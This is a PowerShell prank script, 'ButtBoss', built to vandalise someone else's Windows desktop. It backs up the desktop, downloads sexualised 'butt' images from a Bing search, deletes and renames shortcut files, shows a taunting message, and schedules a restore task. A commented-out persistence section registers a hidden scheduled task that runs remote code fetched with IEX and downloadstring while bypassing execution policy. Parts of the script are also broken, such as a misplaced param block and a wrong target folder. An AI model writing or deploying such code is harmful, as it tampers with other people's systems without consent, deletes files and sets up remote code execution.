
# Set Desktop Path, switch to OneDrive path format if OneDrive folder exists, and run ButtBoss
$desktop = "$home\Desktop"
if((Test-Path $env:OneDrive) -Or (Test-Path $env:OneDriveCommercial)) {
    $desktop = "$env:OneDrive\Desktop"
}
# Copy Desktop Contents to Goofin for safe keepin
Copy-Item -Path $desktop -Destination "C:\Goofin\cuts" -Recurse -Force

# enumerate targets for replacement & grab number of butts needed for grand plan
$targets = gci $desktop -Recurse
$buttlist = (echo $targets | Get-Member)
$buttcount = $buttlist.Count

# seed array from text file and pulls an entry at random, converts to a string and returns
$seeds = Get-Content .\buttseeds.txt
$hash = @{}
foreach ($s in $seeds)
 {
  $hash.add($s,(Get-Random -Maximum $seeds.count))
 }
$hash.GetEnumerator() | Get-Random -OutVariable buttseed
$buttseed | out-string | echo

# script parameters, feel free to change it 
$downloadFolder = "C:\Goofin\butts"
$searchFor =  "sexy ass butts" # $buttseed
$nrOfImages = $buttcount

# create a WebClient instance that will handle Network communications 
$webClient = New-Object System.Net.WebClient

# load System.Web so we can use HttpUtility
Add-Type -AssemblyName System.Web

# URL encode our search query
$searchQuery = [System.Web.HttpUtility]::UrlEncode($searchFor)
$url = "http://www.bing.com/images/search?q=$searchQuery&first=0&count=$nrOfImages&qft=+filterui%3alicense-L2_L3_L4"

# Grab HTML from response
$webpage = $webclient.DownloadString($url)

# regex Urls terminating with '.jpg' or '.png'
$regex = "[(http(s)?):\/\/(www\.)?a-z0-9@:%._\+~#=]{2,256}\.[a-z]{2,6}\b([-a-z0-9@:%_\+.~#?&//=]*)((.jpg(\/)?)|(.png(\/)?)){1}(?!([\w\/]+))"
$listImgUrls = $webpage | Select-String -pattern $regex -Allmatches | ForEach-Object {$_.Matches} | Select-Object $_.Value -Unique

# let's figure out if the folder we will use to store the downloaded images already exists
if((Test-Path $downloadFolder) -eq $false) 
{
  Write-Output "Creating '$downloadFolder'..."

  New-Item -ItemType Directory -Path $downloadFolder | Out-Null
}
foreach($imgUrlString in $listImgUrls) 
{
  [Uri]$imgUri = New-Object System.Uri -ArgumentList $imgUrlString

  # this is a way to extract the image name from the Url
  $imgFile = [System.IO.Path]::GetFileName($imgUri.LocalPath)

  # build the full path to the target download location
  $imgSaveDestination = Join-Path $downloadFolder $imgFile

  Write-Output "Downloading '$imgUrlString' to '$imgSaveDestination'..."
  $webClient.DownloadFile($imgUri, $imgSaveDestination)  
} 

# replace desktop shortcut .lnk files with .jpg files from butts
# Should have it pull each file name and replace itself with that string
# $links = Get-ChildItem -Path $desktop  -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Extension -eq '.lnk' }
# foreach($link in $links) { Write-Output $link.Basename }

param(
[string]$targetFiles = "lnk",
[string]$targetRename = "jpg",
[string]$directory = "$env:TEMP" 
)

$filesToReplace = (Get-ChildItem -Path $directory -Filter *$targetFiles* -Recurse).Fullname

foreach($file in $filesToReplace)
{
    #create a variable that finds a file with $targetFiles and replaces it with the "original" files name.

    write-Host "Beginning file replacement for $file"
    $originalFile = $file.replace("$($targetFiles)","$($targetRename)")

    write-host "File Name is $originalFile"
    if(test-path $originalFile)
    {
        remove-item $originalFile -force
        write-host "Original file $originalFile is removed"
    }
    else
    {
        write-warning "Original File, $originalFile , is not found" 
    }

    if(Test-Path $file)
    {
        Write-Host "$file is renamed to $originalFile"
        Rename-Item $file $originalFile -force
    }
}



# Create array of the photos in butts, choose a random one and replace for each .lnk file

# Stretch Goal play with injecting links into the lnk files for other funny things, or have it inject a URL for a randomized search from the buttsedd list

# Hit 'em with it
echo "Now who's boss." | Out-File -FilePath "C:\Goofin\buttbossin.txt" 
notepad "C:\Goofin\buttbossin.txt"   


# Ghost Protocols

# Politeness Module
# Reset the photots and icons after within 24 hours.

$unbutt = New-ScheduledTaskAction -Execute "powershell.exe Copy-Item -Path 'C:\Goofin\cuts' -Destination $desktop -Recurse -Force"
$scheduleunbutt = New-ScheduledTasktrigger -Once -At 12pm 
Register-ScheduledTask GoodByeButts -Action $unbutt -Trigger $scheduleunbutt

# Persistence Module / Scheduled Task 
# Commented out because it seemed irresponsible to have it be the default. This way people can play with it and not get butt'ed back in a week or two
#
# Get a random number between 1 week and 25 days to re-butt the system 
# $reseed = 7..25 | Get-Random
# [int]$reseed
#  $rebutt = New-ScheduledTaskAction -Execute "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://github.com/mellonaut/buttboss/buttboss.ps1'''))'"
#  $schedulebutts = New-ScheduledTasktrigger -Daily -DaysInterval $reseed -At 10am 
#  Register-ScheduledTask BringBackTheButts -Action $rebutt -Trigger $schedulebutts
# )
